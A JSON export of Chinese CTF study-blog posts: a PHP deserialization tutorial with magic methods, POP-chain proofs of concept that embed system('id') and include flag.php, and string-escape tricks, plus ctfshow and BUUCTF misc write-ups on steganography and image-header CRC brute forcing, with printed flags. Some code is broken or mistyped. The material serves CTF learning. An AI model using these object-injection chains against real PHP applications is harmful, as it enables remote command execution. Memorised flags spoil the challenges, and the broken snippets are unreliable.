[{"content":"​\n反序列化 php面向对象基础知识 类 函数，变量，挺像java的，好好学学吧\n类的结构 class Class_hero{ public name; //成员变量 //成员函数 } \u0026lt;?php highlight_file(__FILE__); class hero{ var $name; var $sex; function jineng($var1) { echo $this-\u0026gt;name; //this当前类,调用上面的name。 echo $var1; } } ?\u0026gt; 实例化与赋值 \u0026lt;?php highlight_file(__FILE__); class hero{ var $name; var $sex; var $blood; function jineng($var1) { echo $this\u0026gt;name.\u0026#34;\u0026lt;br /\u0026gt;\u0026#34;; echo $var1.\u0026#34;\u0026lt;br /\u0026gt;\u0026#34;; } } $cyj= new hero(); //实例化对象并赋值到cyj $cyj-\u0026gt;name=\u0026#39;chengyaojin\u0026#39;; //重新赋值name $cyj-\u0026gt;sex=\u0026#39;男\u0026#39;; //赋值性别 $cyj-\u0026gt;blood=3000; $cyj-\u0026gt;jineng(\u0026#39;zuofan\u0026#39;); print_r($cyj); ?\u0026gt; chengyaojin zuofan hero Object ( [name] =\u0026gt; chengyaojin [sex] =\u0026gt; man ) 赋值 的时候需要\n修饰符 public 完全可以调用\nprivate 只有自己可以调用\nprotected 自己和子类可以调用\n反序列化 序列化的作用 方便存储，数据传输。\n表达方式 空字符： null N;\n整形： 666 i:666;\n只序列化成员变量，不序列化函数。\nprivate\n在序列化的时候会加上类名，并且加上nul，在前后。\n反序列化后仍是对象 反序列化与原来的无关，与传入的字符串值相关 反序列化生成的对象的值由我们提供，并不是原来的benben，而是传入的dazhuang。\n使用成员方法 可以调用上面的成员方法，因为上面的test类还在，所以自己生成的反序列化对象可以调用displayVar方法\n漏洞 成因，反序列化的接受字符串可控。\n魔术方法 自动触发的行为之前或者之后。\n会不会 触发时机\u0026ndash;功能\u0026ndash;参数\u0026ndash;返回值\nconstruct（） 构造方法，实例化对象的时候会自动触发。\n特殊不用调用就可以直接执行函数\n\u0026lt;?php class User { public $username=\u0026#34;benben\u0026#34;; public function __construct($username) { $this-\u0026gt;username = $username; echo \u0026#34;触发了构造函数1次\u0026#34; ; } } $test = new User(\u0026#34;benben\u0026#34;); //自动执行echo函数 $ser = serialize($test); unserialize($ser); $test-\u0026gt;__construct(\u0026#34;dasds\u0026#34;); ?\u0026gt; 触发了构造函数1次 //构造函数触发 触发了构造函数1次 //下面的函数触发 destruct（） 引用被删除或者对象被销毁的时候触发。\n\u0026lt;?php highlight_file(__FILE__); class User { public function __destruct() { echo \u0026#34;触发了析构函数1次\u0026#34;.\u0026#34;\u0026lt;br /\u0026gt;\u0026#34; ; } } $test = new User(\u0026#34;benben\u0026#34;); //触发一次 $ser = serialize($test); unserialize($ser); //触发第二次 ?\u0026gt; 触发了析构函数1次 触发了析构函数1次 反序列化的时候会自动触发这个函数，所以只要提交反序列化的话就会直接执行。\nsleep（） 在使用serialize函数时，会自动调用，先执行sleep函数，然后再进行序列化。\nwakeup 在使用unserialize之前会检查是否有这一函数，如果有的话，会先执行这一函数然后再执行反序列化\n__toString 在一个类被定义为字符串的时候会执行，\n\u0026lt;?php class TestClass { public $foo; public function __construct($foo) { $this-\u0026gt;foo = $foo; } public function __toString() { return $this-\u0026gt;foo; } } $class = new TestClass(\u0026#39;Hello\u0026#39;); echo $class; // 运行结果：Hello print_r($class) ?\u0026gt; invoke() 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。\n\u0026lt;?php class CallableClass { function __invoke($x) { var_dump($x); } } $obj = new CallableClass; $obj(5); var_dump(is_callable($obj)); ?\u0026gt; 错误调用魔术方法 __call() 调用不存在的成员方法\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); class User { public function __call($arg1,$arg2)arg1为callxxx，arg2为传递参数 { echo \u0026#34;$arg1,$arg2[0]\u0026#34;; } } $test = new User() ; $test -\u0026gt; callxxx(\u0026#39;a\u0026#39;); ?\u0026gt; /*运行结果 */ callxxx,a __callStatic() 比上文多了一个静态\n__get() 调用的成员属性不存在。\n\u0026lt;? class User{ public $var1=\u0026#34;1\u0026#34;; function __get($ags1){ echo $ags1.\u0026#34;不存在\u0026#34;; } } $test=new User(); $test-\u0026gt;var2; //触发get，将不存在的var2赋值给ags1； //echo \u0026#34;\\n\u0026#34;.$test-\u0026gt;var1 \u0026gt; shuchu :var2不存在[Finished in 0.1s] __set 给不存在的成员赋值。\n\u0026lt;? class User{ public $var1=\u0026#34;1\u0026#34;; function __set($ags1 ,$ags2){ //$ags1--变量名 ,$ags2--变量值 echo $ags1.\u0026#34;不存在\u0026#34;.$ags2.\u0026#34;赋值给谁啊\u0026#34;; } } $test=new User(); $test-\u0026gt;var2=\u0026#34;benben\u0026#34;; //赋值的var2并不存在 \u0026gt; 输出：var2不存在benben赋值给谁啊 __isset 对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); class User { private $var; public function __isset($arg1 ) { echo $arg1.\u0026#34;不存在或者为私有属性\u0026#34;; } } $test = new User() ; isset($test-\u0026gt;var);\t//var是私有属性，无法被调用 isset($test-\u0026gt;var2); //var2不存在，所以会直接调用 ?\u0026gt; shuchu:var不存在或者为私有属性 var2不存在或者为私有属性 __unset __clone 使用clone的时候触发\npop链 前置知识\u0026ndash;反推法 魔术方法的触发条 件\n\u0026lt;?php class index { private $test; public function __construct(){ $this-\u0026gt;test = new evil(); } // public function __destruct(){ // $this-\u0026gt;test-\u0026gt;action(); // } } // class normal { // public function action(){ // echo \u0026#34;please attack me\u0026#34;; // } // } class evil { var $test2=\u0026#34;system(\u0026#39;id\u0026#39;);\u0026#34;; // public function action(){ // eval($this-\u0026gt;test2); } $a=new index(); echo(serialize($a)); ?\u0026gt; O:5:\u0026#34;index\u0026#34;:1:{s:11:\u0026#34;%00index%00test\u0026#34;;O:4:\u0026#34;evil\u0026#34;:1:{s:5:\u0026#34;test2\u0026#34;;s:13:\u0026#34;system(%27id%27);\u0026#34;;}} //空格替换 上面构造的poc会在实例化index的时候调用__costruct函数，并且将evil实例化给test，就可以顺利的执行下面的 $this-\u0026gt;test-\u0026gt;action();\n\u0026lt;?php class index { private $test; } class evil { var $test2; } $a=new evil(); $a-\u0026gt;test2=\u0026#34;system(\u0026#39;ls\u0026#39;);\u0026#34;; $b=new index(); $b-\u0026gt;test=$a; echo(ser) 这个函数时去除了没用的然后构造。\nb时sec的对像，在反序列化的时候无法触发class fast中的wakeup魔术方法。\n所以想要触发最后的__tostring方法，必须得调用echo的时候输出的是一个对象source，这就需要在反序列化的时候将source赋值为对象，这一点已经做到了，但是这时候并不能调用其他类里面的魔术方法，所以就需要在调用wakeup的时候，source必须是一个sec的对象。所以最后只要反序列化一个sec的对象并且作为参数传递就可以了。\n总结构造的时候，最外层是一个fast的类，因为需要触发wakeup的，魔术方法。往里就是source，但是不能作为一个参数，而是作为一个对象。这个就是sec类的对象。在这个对象中就可以了。\n$a=new fast(); $a-\u0026gt;source =new sec(); //赋值source为对象 echo serialize($a); poc编写 反推法构造\n\u0026lt;?php class Modifier { private $var; public function append($value) { include($value); //第-1步，flag在flag.php中，所以，$value为flag.php.调用append时候可以赋值 echo $flag; //最终目的，输出flag。 } public function __invoke(){ //invoke：对象作为函数调用的时候， $this-\u0026gt;append($this-\u0026gt;var); //这里调用了append，所以为第-2步，var赋值为flag.php。所以寻找调用这个函数。 } } class Show{ public $source; public $str; public function __toString(){ return $this-\u0026gt;str-\u0026gt;source;\t//第-4步，调用str中的source，为了保证这是一个不存在的属性，所以str需要实例化为test，因为Test类中没有source。 } public function __wakeup(){ echo $this-\u0026gt;source;\t//第-5步，为了调用上面的__tostring，所以需要source是一个实例化对象但为作为字符串输出。$source=new Show();因为把自己作为对象，才能够触发下一步的_tostring. } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){\t//为了调用__get需要有一个并不存在的参数被调用，Show中的source符合这个要求， $function = $this-\u0026gt;p;\t//将p作为一个对象，为了__invoke，所以这里需要是Modifier，$p=new Modeifier(). return $function(); //第-3步，这里存在调用函数，所以需要将这里的函数实例化为一个对象，向上看。 } } if(isset($_GET[\u0026#39;pop\u0026#39;])){ unserialize($_GET[\u0026#39;pop\u0026#39;]); 逐步分析，然后再来一步步的构造\n首先明白这一步如何被触发然后去寻找上一步，所以上一步的为了触发这一魔术方法，所以这一步的类必须与下一步有关联，才能调用下一步中的魔术方法\n首先是pop赋值为source，为了tostring，所以但是先有类，$show=new Show(), $source=new Show() 然后为了触发__get，必须要一个test的类 $test=new Test()，并且满足触发条件，所以 $str=new Test() 为了触发__invoke,对象作为函数，$p=new Modeifier() $var =flag.php \u0026lt;?php class Modifier { private $var=\u0026#39;flag.php\u0026#39;; } class Show{ public $source; public $str; } class Test{ public $p; } $mod=new Modifier(); $test=new Test(); $test-\u0026gt;p=new $mod; $show=new Show(); $show-\u0026gt;str=$test; $show-\u0026gt;source=$test; echo serialize($show); 字符逃逸 成员属性保持一致 原理一，最外面的：3要与{}里面的成员属性一致。\n$b=O:1\u0026#34;A\u0026#34;:2{s:2\u0026#34;v1\u0026#34;;s:3:\u0026#34;a\u0026#34;b\u0026#34;;s:2\u0026#34;v2\u0026#34;;s:3:\u0026#34;a\u0026#34;b\u0026#34;;} //外面为2，里面为v1和v2两个成员。 原理二，成员属性名称长度一致，内容长度一致。\n原理三，前面为3，所以说明属性的长度为3，所以a后面的“当作字符串对待，而不是功能符号\n当;}出现的时候代表达到结束符，后面出现的无关\n属性逃逸 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); class A{ public $v1 = \u0026#34;abcsystem()system()system()\u0026#34;; public $v2 = \u0026#39;123\u0026#39;; public function __construct($arga,$argc){ $this-\u0026gt;v1 = $arga; $this-\u0026gt;v2 = $argc; } } $a = $_GET[\u0026#39;v1\u0026#39;]; $b = \u0026#34;system()123\u0026#34;; $data = serialize(new A($a,$b)); $data = str_replace(\u0026#34;system()\u0026#34;,\u0026#34;\u0026#34;,$data); //过滤system() var_dump(unserialize($data)); ?\u0026gt; 原理：将system()替换为空，那么反序列化以后的值就会减少长度，根据上面的原理二可以得知不符合规则，反序列化会出错。例如下面会把原来的system()123变为123.那么11就应该是3了\nO:1:\u0026quot;A\u0026quot;:2:{s:2:\u0026quot;v1\u0026quot;;N;s:2:\u0026quot;v2\u0026quot;;s:11:\u0026quot;123\u0026quot;;}bool(false)\n利用：因为原理三，长度为n，而给出的不足n，那么就会把后面的功能符号作为字符串.所以字符串就会认为是123\u0026quot;;}bool(,但是还需要一个”；}闭合，如果是第一个的话，就可以利用这一规则输入多个system(),那么就会吞掉更多的字符，甚至会把下一个成员属性给吞掉，如果v1的system过多，字符串长度达到23这样很多，甚至会把下面的v2给吞掉，为了满足远离一，那时候就可以在v2的位置重新传入一个v3，但是原来定义的v2并不会消失，就多了一个v3.\n所以来构造，上传所需要的v1，v2。\n\u0026lt;?php class A{ public $v1=\u0026#34;system()\u0026#34;123; public\t$v2=\u0026#34;123\u0026#34;; } 字符串增多 \u0026#34;O:1:\u0026#34;A\u0026#34;:1:{s:2:\u0026#34;v1\u0026#34;;s:2:\u0026#34;ls\u0026#34;;}\u0026#34; str_replace(ls,pwd) \u0026#34;O:1:\u0026#34;A\u0026#34;:1:{s:2:\u0026#34;v1\u0026#34;;s:2:\u0026#34;pwd\u0026#34;;}\u0026#34; //违反了原理二 **利用：**因为每次都会增加一个字符，所以我们可以利用闭合符号，逃逸多个字符，因为每次都会增加一个字符，所以不会出错。根据原理三，;}是作为字符串结束标志，可以将后面的v2注释掉，以此来增加字符。\n","permalink":"https://modesty258.github.io/posts/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"​ 反序列化 php面向对象基础知识 类 函数，变量，挺像java的，好好学学吧 类的结构 class Class_hero{ public name; //成员变量 //成员函数 } \u0026lt;?php highlight_file(__FILE__); class hero{ var $name; var $sex; function jineng($var1) { echo $this-\u0026gt;name; //this当前类,调用上面的name。 echo $var1; } } ?\u0026gt; 实例化与赋值 \u0026lt;?php highlight_file(__FILE__); class hero{ var $name; var $sex; var $blood; function jineng($var1) { echo $this\u0026gt;name.\u0026#34;\u0026lt;br /\u0026gt;\u0026#34;; echo $var1.\u0026#34;\u0026lt;br /\u0026gt;\u0026#34;; } } $cyj= new hero(); //实例化对象并赋值到cyj $cyj-\u0026gt;name=\u0026#39;chengyaojin\u0026#39;;","title":"反序列化"},{"content":"misc zip伪加密 题目已经说了是伪加密，所以打开了zipcenop直接修复，然后解压就可以了\n命令 java -jar ZipCenOp.jar r lm.ziplm为文件名\nlsb隐写 直接打开steg，然后勾选rgb发现，解码出来的是一个png图片的16进制，然后直接保存为png就可以了，这是一张二维码，直接扫描，结果就是flag。\n基础破解 很基础，做就可以了，题目说是四位，那就直接爆破，很基础了。\n","permalink":"https://modesty258.github.io/posts/misc/buuctf_wp/","summary":"misc zip伪加密 题目已经说了是伪加密，所以打开了zipcenop直接修复，然后解压就可以了 命令 java -jar ZipCenOp.jar r lm.ziplm为文件名 lsb隐写 直接打开steg，然后勾选rgb发现，解码出来的是一个png图片的16进制，然后直接保存为png就可以了，这是一张二维码，直接扫描，结果就是fla","title":"Buuctf_wp"},{"content":"​\nrange 循环 range(start, stop[, step]) range(stop) import time #代表0到10，不包括10 for i in (10): print (i) time.sleep(3) #代表1到10，不包括10 for i in (1,10): print(i) #代表1到10，间隔2,不包含10 for i in range(1, 10, 2): print(i) 左闭右开 最左边的start可取，但是右边的step不可取\n开始至默认为0 #开始值不输入的话默认从0开始，打印输出0到9* for i in range(10): print(i) 步长默认为1 不输入，间隔的时候，间隔为1\n与字符串的使用 a=\u0026#34;t¹fs†hªoKw{!aeS6¥eT446xc%4Ý8ïf«73•9b‚7ºeEb|2Td~1:däeñ6úeõ412fT8ñ329éal}\u0026#34; for i in range(0,len(a),2): print(a[i]) t f † ª K { a S ¥ T 4 x % Ý ï « 3 9 ‚ º E | T ~ : ä ñ ú õ 1 f 8 3 9 a } ","permalink":"https://modesty258.github.io/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","summary":"​ range 循环 range(start, stop[, step]) range(stop) import time #代表0到10，不包括10 for i in (10): print (i) time.sleep(3) #代表1到10，不包括10 for i in (1,10): print(i) #代表1到10，间隔2,不包含10 for i in range(1, 10, 2): print(i) 左闭右开 最左边的start可取，但是右边的step不可取 开始至默认为0 #开始值不输入的话默认从0开始，打印输出0到9* for i in range(10): print(i) 步长默认","title":"基础语法"},{"content":"umi-ocr图片提取工具\nmisc1 解压就行\nmisc2 解压一个文本文件，然后打开都是乱码，打开010看一下\n开头就是89 50可以知道了这是一个png文件，然后改为了txt后缀，把后缀改回来就可以了\nmisc3 解压完发现是一个bpg文件，没有什么技巧，直接查看就行了\nmisc4 这道题解压后有6个txt文件，和第二题一样，这道题也是文件后缀，只不过是6个，一个一个改了在进行拼接就行了\nmisc5 打开后显示flag不在这里，仔细找了下，在010中可以找到\nmisc6 和上一道题目一样，只不过不在结尾了，在中间，需要仔细找找\nmisc7 和上一道一样，需要搜一下\nmisc8 题目说在图片文件中，但是实在肉眼找不到，尝试用txt后缀，但是看不到，这时候使用到了binwalk等分离工具\nbinwalk看到文件其实还含有一张png文件，利用foremost分离\n文件就直接出来了，flag就在文件里面\nmisc9 看不懂，我出的时候感觉还是炒冷饭\nmisc10 找了找没找到，直接分离出来了，感觉还是炒冷饭\nmisc11 flag在另一张图，很明显的提示，用binwalk看了一眼，只有一个图片文件，还有一个bzip2文件，不知道该怎么处理\ntweakpng Irfanview图片隐写术 在杂项中，经常会遇到图片被修改，可能是尺寸，也有可能是其他的，但是默认的图片编辑器不会报错，但是专业的文件编辑器会报错，比如上面的两个，\n常见错误 crc错误\n这里有两种可能\n1）图片CRC被修改 可以尝试用十六进制编辑器打开图片，修改CRC。\n2）图片尺寸被修改 这时候就要用十六进制编辑器修改图片尺寸了。\n解决 对于还原尺寸，可以利用蒙一下，也可以用个脚本\nimport os import binascii import struct crcbp = open(\u0026#34;xxx.png\u0026#34;, \u0026#34;rb\u0026#34;).read() #打开图片 for i in range(2000): for j in range(2000): data = crcbp[12:16] + \\ struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i)+struct.pack(\u0026#39;\u0026gt;i\u0026#39;, j)+crcbp[24:29] crc32 = binascii.crc32(data) \u0026amp; 0xffffffff if(crc32 == 0x38162a34): #图片当前CRC print(i, j) print(\u0026#39;hex:\u0026#39;, hex(i), hex(j)) 使用时修改脚本中的打开图片名称和图片当前CRC\n然后在图片所在目录运行Python脚本\n再用010改一下就可以了\ntweakpng idat 当然这一题用的不是上面的，需要用到这个文件\n使用tweakpng打开文件，发现有两个idat文件头，这就说明有问题，\n默认的图片是以第一个idat块来显示，所以将下面的移上去，或者把第一个删除就可以了\n虽然不知道什么原理，将上面的删除了就会显示下面的idat数据头，可能是因为每个idat都对应一个图片，所以只能换一下，或者将下面的移到上面\nmisc12 和上一题一样，有很多idat块，只不过不知道哪一个才是，但是肯定知道最上面的不是，所以一个一个的删除，肯定有一个是\n在删除的过程中，发现中间的几个都是无效的，删到第八个的时候就出来了正确的\nmisc13 flag位置在图片末尾。\n打开010，能看出来图片中含有flag，但是被编码了\n分离了一下，里面估计没有txt文件了，还是尝试解码\nct¹f…s†hªoKw°{!aeS6¥eT446xc%4Ý8ïf«73•9b‚7ºeEb|2Td~1:däeñ6úeõ412fT8ñ329éal} 不是base，仔细一看，根本就没有编码，只是每两个之间用一个特殊字符隔开了，尝试用python来跑个脚本\na=\u0026#34;c\u001at¹f…s†hªoKw°{!a\u0014eS6¥eT446xc%4Ý8ïf«7\u00103•9\u001fb‚7ºeEb|2Td~1:däeñ6úeõ4\u001e1\u00072\u001dfT8ñ329éal}\u0026#34; flag=\u0026#34;\u0026#34; for i in range(0,len(a),2): hexStr=a[i] flag+=hexStr print(flag) ctfshow{ae6e46c48f739b7eb2d1de6e412f839a}\nctfshow{ae6e3ea48f518b7e42d7de6f412f839a}\nmisc14 dd 文件分离 binwalk分析一下，发现有两个文件，直接分离\n临时学习了个dd指令，用来分离文件：\ndd if=misc14.jpg of=1.png skip=2103 bs=1 if代表输入文件，of代表输出文件，skip代表跳过到多少个块后开始（binwalk可以看到），bs是代表字节为单位的块的大小，参数还有很多，目前先记住这几个就能分出图片了。\n这里由于binwalk查看到在2103个块开始还有一个JPEG文件，那就直接shkip到2103开始分离。\n成功得到flag。\n解法二 从binwalk可以看到里面有两个jpg文件，可以直接用010将另一个文件直接从里面提取出来，直接找到文件头FF D8，第三个就是我们需要的，直接复制出来生成一个新的文件就可以了\nmisc15 是一个bmp文件，拿binwalk分析了以下没看见啥有用的。\n直接搜，拿010\nmisc16 binwalk扫一下，发下确实有点东西，但是不懂，不像之前有图片文本来得那么直接\n诶，怎么说呢，有时候可能不一定没有txt就没有文本，可以用binwalk直接分离出来一个dd4，没错，就是他\nbinwalk tip 怎么说呢，以后遇见题目，即使没有你认识的文件，也要尝试分离一下，分离不出来就用foremost或者dd，或者其他的一些，总而言之只要里面不是一个文件，就分离出来再继续做\nzsteg 检测隐写 zsteg可以检测PNG和BMP图片里的隐写数据。\n目前，zsteg支持检测：\nPNG 和 BMP 格式的 LSB 隐写术 zlib 压缩数据 打开Stego Camouflage 1.2.1 LSB 还是转到分离工具去看用法吧\n这里先浅浅的使用一下\nmisc17 直接分析，里面还有一个bzip2\n因为直接用分离工具提取会将文件损坏，所以只好用zsteg工具\n直接用zsteg看一下隐藏文件，看到了16进制，但是并没有flag，\n直接用zsteg将隐藏文件提取到一个1.txt当中，打开再看，发现是乱码，再用binwalk分离一下就有了\n看了一下wp，发现当时用zsteg检测出来的extradata:0 ，是在这个里面存在隐藏数据，所以应该将这个文件给提取出来，所以就有了对应的命令 zsteg -E “extradata:0” misc17.png \u0026gt; 1.txt\nmisc18 看题目要求就知道了，在图片的属性里面，就是不知道010能不能看出来试试\n嗯，010是有的，但是有一点，他得拼接，我认为还是属性方便\nctfshow{325d60c208f728ac17e5f02d4cf5a839}\nmisc19 ctfshow{dfdcf08038cd446a5eb50782f8d3605d}\n怎么说呢，属性不一定能找到，但是010一定可以找到\nexiftool简介 查看图片简介 这个软件能扫出来图片的作者，等属性信息，主机，评论什么的也可以直接显示出来，以后可以直接看一眼\n命令\nexiftool flie_name misc20 直接用exiftool找出来了图片的所有信息，基本有了\n这图片也太难看了。来自：西替爱抚秀大括号西九七九六四必一诶易西爱抚零六易一弟七九西二一弟弟诶弟五九三易四二大括号\n很显然了，这就是flag\nctfshow{c97964b1aecf06e1d79c21ddad593e42}\nmisc21 题目说是看序号，打开010看了一看，大概有思路了，首先题目给出了，在010中也看到了数字，应该是某种加密，再不济也是一个ascil\n然后用exif工具扫了一下，看到了编码方式Baseline DCT, Huffman coding就是霍夫曼编码，先复制出来，再解一下就ok了\nX Resolution: 3902939465 0xe8a22149 Y Resolution: 2371618619 0x8d5c073b X Position: 1082452817 0x4084eb51 Y Position: 2980145261 0xb1a1686d Serial Number: 686578285826597329 先把Serial Number进行进制转换，使用16进制转换到文本字符串，得到hex(X\u0026amp;Ys)，经查询，他的意思是将下x，y的十进制转化为16进制，所以直接转就可以了\npython直接运行就可以了\ne8a221498d5c073b4084eb51b1a1686d，再套上壳\nmisc22 还是用exif扫了一下，找到了需要的东西，就是这个Binary data 18195 bytes, use -b option to extract\n看到这个是不是莫名的熟悉\n好吧，我放弃了\n根据这个就可以把他用zsteg给提出去，很神奇\nmisc23 很好，psd文件，不知道是啥，搜一哈，Photoshop\n算了，还是用exif吧\nctfshow{49520599-6932-e144-8f4b-dfd5873be5bc}\n嘻嘻嘻，出了，美美提交，焯，错了，好难的样子\n发现给的这一堆逼数没一点用，还是大佬wp\n时间戳 1997:09:22 02:17:02+08:00 874865822 3425649e\n2055:07:15 12:14:48+08:00\n2038:05:05 16:50:45+08:00\n1984:08:03 18:41:46+08:00\n利用在线网站转换一下，再转换成16进制，出来的就是了\nmisc41 文件结构 从这里开始，就来到一个新的篇章了，属于文件结构，就需要修改长宽高来判断了\nmisc24 flag在图片上面，就说明这个图片的高度不够，需要修改高度\n通过图片的数据块可以知道图片的宽高在哪里修改，只需要修改高度就可以出来了\n将高度处的96改为FA就可以得出来了\nmisc25 首先，这时候最好用kali或者tweakpng打开文件，因为这种隐藏宽高的图片一般是看不出来修改的痕迹，专业工具会更好看出来，比如这一个，就是一个crc的错误，在上面的misc11有，直接还原就可以了\n修改高度的话可以和上一题一样，就可以得到flag了\nmisc26 这个说在多下面，我管你多下面，我直接改成FA(250)，你还能有多下面,好吧，真的比这个还下面，我只好改为56ce(22222)了，出了，但是没有完全出\ncftshow{94aef1+True height(hex) of this picture+087a7ccf2e28e742efd704c} 这一道题需要得到正确的高度并且结合得到flag，出题人，你是个狠人呀。\n这时候就得上脚本跑出来正确的高度了\nimport os import binascii import struct crcbp = open(\u0026#34;misc26.png\u0026#34;, \u0026#34;rb\u0026#34;).read() #打开图片 for i in range(2000): for j in range(2000): data = crcbp[12:16] + \\ struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i)+struct.pack(\u0026#39;\u0026gt;i\u0026#39;, j)+crcbp[24:29] crc32 = binascii.crc32(data) \u0026amp; 0xffffffff if(crc32 == 0xEC9CCBC6): #图片当前CRC print(i, j) print(\u0026#39;hex:\u0026#39;, hex(i), hex(j)) 先找到crc32值\n这个是在图片的后面，先把5个字节跳过去，然后后面的4个字节就是就是crc32的值，带进去爆破出来就可以了。\n然后再代入hex函数\nmisc27 答案在图片下面，那还是老规矩呗，直接打开宽高位修改图片，但是发现宽高位的不是宽高，这就要利用到我们的搜索能力了，打开图片属性，将图片的宽高转化为16进制，然后再010里面搜索，就可以很轻易的搜到了，然后再将图片的高改为和宽一样，flag就出来了，当然这个高度随便改，能把下面的flag给显示出来就可以了\ngif 文件头部分(Header) GIF署名和版本号 GIf署名来判断一个文件是不是gif文件，这一部分由三个字符组成，文件版本号也是由3个字符组成，一般为87a，或者为89a\nGIF数据流部分 逻辑屏幕标识符(Logical Screen Descriptor) 这一部分由7个字节组成，定义了GIF图象的大小（高和宽之类）、颜色深度(Color Bits)、背景色(Blackground ColorIndex)以及有无全局颜色列表(Global Color Table)和颜色列表的索引数(ndex Count)\n具体描述见下表:\n目前只是需要这些，还有一些理论知识，还是得结合题目去研究\n考点 修补文件头 空间轴隐藏信息 时间轴隐藏信息 修复文件头 这种基本还好，结合上面的文件头部信息，只需要找到一张标准的gif文件,对照进行修补就可以了。\n空间轴隐藏信息 由于gif文件的特性，由一帧一帧文件组成，所以每一帧的图片，或者多张图片的结合，都可以隐藏信息\ngif的每一帧的宽高都得进行修改，或者进行分离，找出带有flag的那一帧\n解决方式 使用stesolvefj打开图片，Stegsolve Analyse-Frame Brower进行分帧，进行逐帧分析 可以使用conwert命令逐帧分开 convert persistant.gif transparent white result.gif 时间轴隐藏信息 每一帧的时间间隔也可以隐藏信息\n解决 通过工具的利用，来获得时间的间隔\nidentify命令清晰的打打印出每一顿的时间间隔 identify -format\u0026quot;%Tn”100.gif根据时间间隔的规律解决题目\nmisc28 这次的图片是gif文件，可能这个文件有点不同，需要特殊修改，所以在网上看了一下\n这个图片的宽高信息与其他的图片不同，所以搜索找到修改就可以了\n利用模板，每次在打开新的图片文件的时候，010都会加载模板，这种模板可以大大的降低难度，因为模板可以显示出图片的信息，更为方便的修改，当然得是一个好的图片\n修改了以后，打开图片还是老样子，根本就不显示，flag，再在题目中搜索，发现只是改了一处地方，另一处的宽高并没有修改，可能是因为这是一张动图的原因，不太了解\ntip确实如此，gif的每一帧的宽高都得进行修改，或者进行分离，找出带有flag的那一帧\n所以这一得长个教训，以后改的话最好还是用搜索，因为在你不知道这个图片格式的情况下，即使你有模板，也不一顶能够完全的正确。\nmisc29 这一次的图片是10帧，就必须利用工具逐帧分析了，可以利用stegsolve工具\n在这之前，还需要先修改一下他的宽高，因为是10张图片，所以需要修改10次，gif的每一帧的宽高都得进行修改，或者进行分离，找出带有flag的那一帧，这里我就用的替换，将96 00全部替换为 84 03，这样的话就可以找到flag了。\nmisc30 这张图是bmp，并且被拉宽了，题目提示是直接修改宽度，可能是个开胃菜\n确实只是个开胃菜，套用了一下模板，找到了宽度修改以后就出来了\nmisc31 明说了，高度正确，宽度不对，基本得跑脚本了，当然也可以自己计算，网上也有\nimport struct import zlib f = open(\u0026#39;./misc31.bmp\u0026#39;,\u0026#39;rb\u0026#39;) c = f.read() width = c[18:22] height = c[22:26] # 爆破bmp宽度 for i in range(900,1100):#规定大概宽度区间 f1 = open(\u0026#39;./bpout/\u0026#39;+str(i)+\u0026#39;.bmp\u0026#39;,\u0026#39;wb\u0026#39;) #需要创建一个名为bpout的文件夹 # print(struct.pack(\u0026#39;\u0026gt;i\u0026#39;,i)[::-1]) img = c[:18]+struct.pack(\u0026#39;\u0026gt;i\u0026#39;,i)[::-1]+c[22:] f1.write(img) f1.close() 这个脚本本质也很简单，就是生成了100张图片，让你看看哪个是对的，找了找，发现是1082，出了\nmisc32 只高爆宽，我上脚本了，会的可以计算一下\nimport zlib import struct # 同时爆破宽度和高度 filename = \u0026#34;misc32.png\u0026#34; with open(filename, \u0026#39;rb\u0026#39;) as f: all_b = f.read() data = bytearray(all_b[12:29]) n = 4095 for w in range(n): width = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, w)) for h in range(n): height = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) #替换成图片的crc if crc32result == 0xE14A4C0B: print(\u0026#34;宽为：\u0026#34;, end = \u0026#39;\u0026#39;) print(width, end = \u0026#39; \u0026#39;) print(int.from_bytes(width, byteorder=\u0026#39;big\u0026#39;), end=\u0026#39; \u0026#39;) print(hex(int.from_bytes(width, byteorder=\u0026#39;big\u0026#39;))) print(\u0026#34;高为：\u0026#34;, end = \u0026#39;\u0026#39;) print(height, end = \u0026#39; \u0026#39;) print(int.from_bytes(height, byteorder=\u0026#39;big\u0026#39;), end=\u0026#39; \u0026#39;) print(hex(int.from_bytes(height, byteorder=\u0026#39;big\u0026#39;))) # sys.exit() #如果加上可以立即结束程序，但是有利有弊吧 宽为：bytearray(b\u0026rsquo;\\x00\\x00\\x04\\x14\u0026rsquo;) 1044 高为：bytearray(b\u0026rsquo;\\x00\\x00\\x00\\x96\u0026rsquo;) 150\n宽为：bytearray(b\u0026rsquo;\\x00\\x00\\x04\\x14\u0026rsquo;) 1044 0x414 高为：bytearray(b\u0026rsquo;\\x00\\x00\\x00\\x96\u0026rsquo;) 150 0x96\nok,改一下，最好让他自己改为16进制，\u0026mdash;chatgpt yyds\nmisc33 怎么说呢，逼着人用脚本。\n宽为：bytearray(b\u0026rsquo;\\x00\\x00\\x03\\xd2\u0026rsquo;) 978 0x3d2 高为：bytearray(b\u0026rsquo;\\x00\\x00\\x00\\x8e\u0026rsquo;) 142 0x8e\nmisc34 不得不说，出题人真的丧心病狂，狗急跳墙，crc也改了，这让我怎么爆破，看看上面的crc修复吧\n哦，大概知道了，高度知道，宽度大于900，那就直接用上面的生成200张不就好了\n对了，上面的是bmp脚本，这是需要修改一下二进制的宽高位置，我直接用chatgpt生成了，只能说yyds\nimport struct f = open(\u0026#39;misc34.png\u0026#39;,\u0026#39;rb\u0026#39;) c = f.read() chunk_width = c[16:20] chunk_height = c[20:24] # 爆破png宽度 for i in range(900,1300): #规定大概宽度区间 f1 = open(\u0026#39;output/\u0026#39; + str(i) + \u0026#39;.png\u0026#39;,\u0026#39;wb\u0026#39;) width = struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i) # 修改宽度信息 img = c[:16] + width + c[20:] f1.write(img) f1.close() misc35 